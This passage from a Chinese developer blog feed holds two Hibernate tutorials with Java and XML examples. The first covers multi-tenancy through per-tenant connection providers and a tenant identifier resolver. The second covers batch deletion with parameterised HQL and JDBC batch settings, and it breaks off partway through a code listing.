    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsAggressiveRelease</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-comment">// Implement other required methods...</span>
}
</code></pre>
<h4 data-id="heading-3">实现<code>CurrentTenantIdentifierResolver</code>接口</h4>
<p><code>CurrentTenantIdentifierResolver</code>接口用于解析当前租户标识符。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.context.spi.CurrentTenantIdentifierResolver;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TenantIdentifierResolverImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CurrentTenantIdentifierResolver</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">resolveCurrentTenantIdentifier</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 从上下文或者请求中获取当前租户标识符</span>
        <span class="hljs-keyword">return</span> TenantContext.getCurrentTenant();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">validateExistingCurrentSessions</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}
</code></pre>
<h4 data-id="heading-4">实体类定义</h4>
<p>以下是一个简单的实体类<code>Product</code>的定义：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-comment">// Getters and Setters</span>
}
</code></pre>
<h4 data-id="heading-5">使用多租户支持</h4>
<p>在应用程序中使用多租户支持：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiTenantExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 设置当前租户</span>
        TenantContext.setCurrentTenant(<span class="hljs-string">"tenant1"</span>);

        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
            product.setName(<span class="hljs-string">"Product A"</span>);
            product.setPrice(<span class="hljs-number">100.0</span>);
            session.save(product);
            transaction.commit();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-6">2. Database-based 多租户</h3>
<p>在这种模式中，每个租户有独立的数据库实例。</p>
<h4 data-id="heading-7">配置Hibernate</h4>
<p>在<code>hibernate.cfg.xml</code>中配置Hibernate：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 数据库连接配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_default_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate 属性配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 多租户配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.multiTenancy"</span>&gt;</span>DATABASE<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.tenant_identifier_resolver"</span>&gt;</span>com.example.TenantIdentifierResolverImpl<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.multi_tenant_connection_provider"</span>&gt;</span>com.example.MultiTenantConnectionProviderImpl<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 映射类 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-8">实现<code>MultiTenantConnectionProvider</code>接口</h4>
<p>实现<code>MultiTenantConnectionProvider</code>接口，用于提供基于租户的连接。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.engine.jdbc.connections.spi.MultiTenantConnectionProvider;
<span class="hljs-keyword">import</span> org.hibernate.service.spi.Stoppable;

<span class="hljs-keyword">import</span> javax.sql.DataSource;
<span class="hljs-keyword">import</span> java.sql.Connection;
<span class="hljs-keyword">import</span> java.sql.SQLException;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiTenantConnectionProviderImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MultiTenantConnectionProvider</span>, Stoppable {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, DataSource&gt; dataSources = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MultiTenantConnectionProviderImpl</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 初始化各个租户的数据源</span>
        dataSources.put(<span class="hljs-string">"tenant1"</span>, createDataSource(<span class="hljs-string">"jdbc:mysql://localhost:3306/tenant1"</span>, <span class="hljs-string">"username"</span>, <span class="hljs-string">"password"</span>));
        dataSources.put(<span class="hljs-string">"tenant2"</span>, createDataSource(<span class="hljs-string">"jdbc:mysql://localhost:3306/tenant2"</span>, <span class="hljs-string">"username"</span>, <span class="hljs-string">"password"</span>));
        <span class="hljs-comment">// ... add other tenants</span>
    }

    <span class="hljs-keyword">private</span> DataSource <span class="hljs-title function_">createDataSource</span><span class="hljs-params">(String url, String username, String password)</span> {
        <span class="hljs-type">DataSourceBuilder</span> <span class="hljs-variable">dataSourceBuilder</span> <span class="hljs-operator">=</span> DataSourceBuilder.create();
        dataSourceBuilder.url(url);
        dataSourceBuilder.username(username);
        dataSourceBuilder.password(password);
        <span class="hljs-keyword">return</span> dataSourceBuilder.build();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getAnyConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">return</span> dataSources.get(<span class="hljs-string">"tenant1"</span>).getConnection(); <span class="hljs-comment">// 默认租户连接</span>
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">releaseAnyConnection</span><span class="hljs-params">(Connection connection)</span> <span class="hljs-keyword">throws</span> SQLException {
        connection.close();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String tenantIdentifier)</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> dataSources.get(tenantIdentifier);
        <span class="hljs-keyword">if</span> (dataSource != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> dataSource.getConnection();
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HibernateException</span>(<span class="hljs-string">"Could not find data source for tenant "</span> + tenantIdentifier);
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">releaseConnection</span><span class="hljs-params">(String tenantIdentifier, Connection connection)</span> <span class="hljs-keyword">throws</span> SQLException {
        connection.close();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsAggressiveRelease</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-comment">// Implement other required methods...</span>
}
</code></pre>
<h4 data-id="heading-9">实现<code>CurrentTenantIdentifierResolver</code>接口</h4>
<p>实现<code>CurrentTenantIdentifierResolver</code>接口，用于解析当前租户标识符。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.context.spi.CurrentTenantIdentifierResolver;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TenantIdentifierResolverImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CurrentTenantIdentifierResolver</span> {

  
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（56）Hibernate的批量删除策略是什么？]]></title>    <link>https://juejin.cn/post/7597452210646810624</link>    <guid>https://juejin.cn/post/7597452210646810624</guid>    <pubDate>2026-01-21T11:55:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597452210646810624" data-draft-id="7597635202324824116" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（56）Hibernate的批量删除策略是什么？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-21T11:55:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（56）Hibernate的批量删除策略是什么？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T11:55:28.000Z" title="Wed Jan 21 2026 11:55:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Hibernate提供了几种方式来实现批量删除操作，主要包括使用HQL（Hibernate Query Language）和批量操作设置来进行优化。详细解释如下：</p>
<h3 data-id="heading-0">1. 使用HQL进行批量删除</h3>
<p>通过HQL可以直接执行批量删除操作，避免逐条删除实体。以下是详细实现和代码示例：</p>
<h4 data-id="heading-1">配置Hibernate</h4>
<p>在<code>hibernate.cfg.xml</code>中配置Hibernate：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 数据库连接配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate 属性配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 映射类 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-2">实体类定义</h4>
<p>以下是一个简单的实体类<code>Product</code>的定义：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-comment">// Getters and Setters</span>
}
</code></pre>
<h4 data-id="heading-3">使用HQL进行批量删除</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateBatchDeleteExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        deleteProductsByPrice(<span class="hljs-number">1000.0</span>);
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteProductsByPrice</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">hql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"delete from Product where price &gt; :price"</span>;
            <span class="hljs-type">int</span> <span class="hljs-variable">deletedEntities</span> <span class="hljs-operator">=</span> session.createQuery(hql)
                                         .setParameter(<span class="hljs-string">"price"</span>, price)
                                         .executeUpdate();
            transaction.commit();
            System.out.println(<span class="hljs-string">"Number of products deleted: "</span> + deletedEntities);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-4">2. 使用批量操作设置进行优化</h3>
<p>Hibernate允许通过批量操作设置来优化批量删除的性能。在<code>hibernate.cfg.xml</code>中设置批量操作属性：</p>
<h4 data-id="heading-5">配置批量操作</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- other configurations --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.jdbc.batch_size"</span>&gt;</span>20<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.order_inserts"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.order_updates"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-6">批量删除示例</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateBatchDeleteExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        batchDeleteProductsByPrice(<span class="hljs-number">1000.0</span>);
        sessionFactory.close();
    }

